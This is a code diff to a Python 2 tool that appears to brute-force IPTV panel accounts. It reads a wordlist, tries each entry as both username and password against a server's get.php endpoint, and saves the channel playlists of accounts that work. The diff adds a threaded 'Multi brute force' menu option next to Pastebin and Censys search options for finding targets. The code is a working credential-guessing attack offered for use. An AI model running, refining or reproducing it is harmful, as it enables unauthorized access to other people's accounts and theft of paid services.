@@ -13,7 +13,7 @@ def search_account_threading(threadname,URL,lista):
 	directory = "output"
 	with open(lista) as f:
 		content = f.readlines()
-	print "[i] thread-"+str(threadname)+" started!"
+	print ("\r" +"[i] thread-"+str(threadname)+" started!")
 	for r in content:
 		req = urllib2.Request( URL + '/get.php?username=%s&password=%s&type=m3u&output=mpegts'%(r.rstrip().lstrip(),r.rstrip().lstrip()))
 		response = urllib2.urlopen(req)
@@ -28,7 +28,7 @@ def search_account_threading(threadname,URL,lista):
 			out_file = open(str(new_path) + "/tv_channels_%s.m3u" % r.rstrip().lstrip(), "w")
 			out_file.write(the_page)
 			out_file.close()
-	print "[i] thread-"+str(threadname)+" finished!"
+	print ("\r" +"[i] thread-"+str(threadname)+" finished!")
 
 class IPTV(object):
 	def __init__(self, stdout=None, stderr=None):
@@ -129,8 +129,10 @@ def menu():
         print (tre + " Pastebin crawl")
         quattro = colored ('[4]','green')
         print (quattro + " Censys Search")
-        cinque = colored ('[5]','red')
-        print (cinque + " Quit")
+        cinque = colored ('[5]','green')
+        print (cinque + " Multi brute force")
+        sei = colored ('[6]','red')
+        print (sei + " Quit")
         print
         selection = input("Select an option: ")
 
@@ -139,6 +141,20 @@ def menu():
             menu()
 
         elif(selection==2):
+        	server = raw_input("Server url: ")
+        	app.search_account(server)
+
+
+        elif(selection==3):
+            app.search_pastebin()
+            menu()
+
+
+        elif(selection==4):
+            app.search_censys()
+            menu()
+
+        elif(selection==5):
 		server = raw_input("Server url: ")
 	    	count = 1
 	    	threads = []
@@ -157,15 +173,7 @@ def menu():
 
             	menu()
 
-        elif(selection==3):
-            app.search_pastebin()
-            menu()
-
-        elif(selection==4):
-            app.search_censys()
-            menu()
-
-        elif(selection==5):
+        elif(selection==6):
             sys.exit(0)
 
         else:
